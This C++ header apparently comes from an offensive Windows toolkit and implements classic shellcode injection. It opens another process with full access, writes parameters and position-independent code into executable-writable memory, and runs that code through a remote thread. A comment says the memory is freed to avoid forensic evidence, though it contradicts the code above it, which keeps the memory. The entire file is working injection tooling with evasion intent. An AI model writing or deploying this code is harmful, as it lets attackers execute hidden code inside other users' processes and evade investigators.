#pragma once
#include "pch.h"
#include "../SubZeroUtils/AutoHandle.h"
#include "../SubZeroUtils/Win32ErrorCodeException.h"
#include "../SubZeroUtils/VirtualAllocExGuard.h"
#include "../SubZeroUtils/DebugPrint.h"
#include "../SubZeroUtils/StringUtils.h"

class PicInjection
{
	static void writeToTargetProcess(HANDLE targetProcess, LPVOID remoteAddress, LPVOID data, SIZE_T dataSize);
public:
	
	template <typename PicParameters>
	static void InjectPic(const std::uint32_t targetPid, PicParameters* picParams, const PVOID picStart, const PVOID picEnd)
	{

		const int picBytesSize = reinterpret_cast<LPBYTE>(picEnd) - reinterpret_cast<LPBYTE>(picStart);
		if (0 >= picBytesSize)
		{
			throw std::runtime_error("[-] Invalid PIC size");
		}
		
		const AutoHandle targetProcess(OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid));
		if (nullptr == targetProcess.get())
		{
			throw Win32ErrorCodeException("[-] Could not open handle to target process");
		}

		DEBUG_PRINT("[+] Open handle to target process");


		VirtualAllocExGuard remoteParamsMemoryGuard(targetProcess.get(), sizeof(PicParameters), PAGE_EXECUTE_READWRITE);
		DEBUG_PRINT("[+] Allocate memory for PIC parameters in target process");


		writeToTargetProcess(targetProcess.get(), remoteParamsMemoryGuard.get(), picParams, sizeof(PicParameters));
		DEBUG_PRINT("[+] Write PIC parameters to target process at address: " + StringUtils::hexValue(reinterpret_cast<std::uint64_t>(remoteParamsMemoryGuard.get())));


		VirtualAllocExGuard remotePicMemoryGuard(targetProcess.get(), picBytesSize, PAGE_EXECUTE_READWRITE);
		DEBUG_PRINT("[+] Allocate memory for PIC in target process");


		writeToTargetProcess(targetProcess.get(), remotePicMemoryGuard.get(), picStart, picBytesSize);
		DEBUG_PRINT("[+] Write PIC to target process at address: " + StringUtils::hexValue(reinterpret_cast<std::uint64_t>(remotePicMemoryGuard.get())));


		DWORD threadId;
		const AutoHandle targetThread(CreateRemoteThread(targetProcess.get(), nullptr, 0,
			static_cast<LPTHREAD_START_ROUTINE>(remotePicMemoryGuard.get()), remoteParamsMemoryGuard.get(), 0, &threadId));
		if (nullptr == targetThread.get())
		{
			throw Win32ErrorCodeException("[-] Could not create remote thread in target process");
		}

		DEBUG_PRINT("[+] Create remote thread in target process TID=" + std::to_string(threadId));


		// The injection succeeded, so we don't want to destroy the memory:
		remoteParamsMemoryGuard.release();
		remotePicMemoryGuard.release();

		/*
		 * VirtualAllocExGuard get called automatically in order to release the
		 * shellcode's memory and avoid forensics evidence.
		 * If you want to keep the remote allocation after the injection add:
			 remoteParamsMemoryGuard.release();
			 remotePicMemoryGuard.release();
		*/
	}
};